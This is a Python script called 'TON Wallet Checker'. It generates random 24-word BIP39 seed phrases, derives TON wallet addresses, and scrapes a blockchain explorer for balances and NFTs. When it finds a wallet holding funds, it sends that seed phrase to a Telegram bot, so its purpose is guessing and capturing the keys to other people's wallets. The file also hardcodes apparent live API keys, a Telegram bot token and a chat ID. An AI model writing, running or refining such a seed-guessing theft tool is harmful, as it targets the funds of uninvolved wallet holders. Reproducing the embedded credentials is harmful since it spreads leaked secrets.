import asyncio
import aiohttp
from aiohttp import ClientSession, ClientTimeout
from tonutils.client import TonapiClient
from tonutils.wallet import WalletV5R1
from bs4 import BeautifulSoup
import re
import random
from datetime import datetime
from typing import List, Tuple, Optional
import logging
from urllib.parse import quote
import sys

# Configuration
API_KEYS = [
    "AHUQDN4TWLA2FMQAAAAFD4VJBEPQ6EETRC7ABUX5LJFUNTUEXXPMIP3LQYP5BKRDQROXARI",
    "AGAAQMVUZT5KYQQAAAAFZNNRNLFYBICC7GPH5P6ON675LEKGSAW6ILXJLNBGWCOTVZRCOLA",
    "AEEPX4IKTP3KGRQAAAAAEXUPVWU6D3AXHMB26ZQAPMO34OA6SKR3AVH5IZR6AYY5WGBGLLY",
    "AECSCF5RUXIORHYAAAAKK7ZZWC7TB4S6SSKNWV4QG2W7KYB4AZP4JYDXVFP4IZGR4CXOTUY",
    "AHYTHTZKAHHJR5AAAAAORSBEP6LMR7S32IDEDHLFUIGMK7K5CTEXOSPL2QDEY2BUZ5TLXRA"
]
IS_TESTNET = False
TELEGRAM_TOKEN = "8173054236:AAFVqnTIlzX6eYMIF03UJeAKaqmdTlDmKAk"
TELEGRAM_CHAT_ID = "1046292733"
REQUEST_TIMEOUT = 30
RATE_LIMIT = 1.0  # seconds between requests per API key

# Load BIP39 words
try:
    with open("bip39.txt", "r") as f:
        BIP39_WORDS = f.read().split()
except FileNotFoundError:
    print("Error: bip39.txt not found!")
    sys.exit(1)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("wallet_checker.log"),
        logging.StreamHandler()
    ]
)

class Color:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    END = '\033[0m'

class WalletChecker:
    def __init__(self):
        self.semaphores = {key: asyncio.Semaphore(1) for key in API_KEYS}
        self.session = None
        self.rate_limit = {key: 0 for key in API_KEYS}

    async def init_session(self):
        timeout = ClientTimeout(total=REQUEST_TIMEOUT)
        self.session = ClientSession(timeout=timeout)

    async def close_session(self):
        if self.session:
            await self.session.close()

    async def send_to_telegram(self, message: str):
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        params = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        
        try:
            async with self.session.get(url, params=params) as resp:
                if resp.status != 200:
                    logging.error(f"Telegram API error: {resp.status}")
        except Exception as e:
            logging.error(f"Telegram send error: {str(e)}")

    async def check_rate_limit(self, api_key: str):
        now = asyncio.get_event_loop().time()
        elapsed = now - self.rate_limit[api_key]
        if elapsed < RATE_LIMIT:
            delay = RATE_LIMIT - elapsed
            await asyncio.sleep(delay)
        self.rate_limit[api_key] = now

    async def fetch_wallet_data(self, address: str) -> Tuple[Optional[List[str]], Optional[str]]:
        url = f"https://tonviewer.com/{address}"
        try:
            async with self.session.get(url) as response:
                if response.status != 200:
                    return None, f"HTTP Error {response.status}"
                
                html = await response.text()
                result = []
                
                if "Collectibles" in html:
                    result.append("💰 <b>NFT Detected</b>")
                
                soup = BeautifulSoup(html, 'html.parser')
                balance_div = soup.find(lambda tag: tag.name == 'div' and tag.get_text(strip=True) == "Balance")
                
                if balance_div:
                    ton_div = balance_div.find_next(lambda tag: tag.name == 'div' and "TON" in tag.get_text())
                    if ton_div:
                        ton_match = re.search(r"(\d+\.\d+)", ton_div.get_text(strip=True))
                        if ton_match:
                            balance = float(ton_match.group(1))
                            if balance > 0:
                                result.append(f"💎 <b>Balance: {balance} TON</b>")
                            else:
                                result.append(f"Balance: {balance} TON")
                
                return result if result else ["Empty wallet"], None
                
        except Exception as e:
            return None, str(e)

    async def process_wallet(self, api_key: str):
        client = TonapiClient(api_key=api_key, is_testnet=IS_TESTNET)
        
        while True:
            try:
                async with self.semaphores[api_key]:
                    await self.check_rate_limit(api_key)
                    
                    seed = " ".join(random.sample(BIP39_WORDS, 24))
                    wallet, _, _, _ = WalletV5R1.from_mnemonic(client, seed.split())
                    address = wallet.address.to_str()
                    
                    logging.info(f"{Color.BLUE}Checking:{Color.END} {address[:8]}...{address[-6:]}")
                    
                    result, error = await self.fetch_wallet_data(address)
                    
                    if error:
                        logging.error(f"{Color.RED}Error:{Color.END} {error}")
                        continue
                    
                    if "TON" in str(result) or "NFT" in str(result):
                        message = (
                            f"🔹 <b>New Wallet Found!</b>\n"
                            f"🌱 <b>Seed:</b> <code>{seed}</code>\n"
                            f"📬 <b>Address:</b> <code>{address}</code>\n"
                            f"📊 <b>Details:</b>\n" + "\n".join(result)
                        )
                        
                        logging.info(f"{Color.GREEN}Found wallet:{Color.END}\n{message}")
                        await self.send_to_telegram(message)
                    else:
                        logging.debug(f"Empty wallet: {address}")
                        
            except Exception as e:
                logging.error(f"{Color.RED}Critical error:{Color.END} {str(e)}")
                await asyncio.sleep(5)

    async def run(self):
        await self.init_session()
        try:
            tasks = [self.process_wallet(key) for key in API_KEYS]
            await asyncio.gather(*tasks)
        finally:
            await self.close_session()

def main():
    checker = WalletChecker()
    try:
        asyncio.run(checker.run())
    except KeyboardInterrupt:
        logging.info("Shutting down gracefully...")
    except Exception as e:
        logging.error(f"Fatal error: {str(e)}")

if __name__ == "__main__":
    print(f"""
{Color.BLUE}╔══════════════════════════════════╗
║      TON Wallet Checker        ║
║      {datetime.now().strftime('%Y-%m-%d %H:%M')}       ║
╚══════════════════════════════════╝{Color.END}
""")
    main()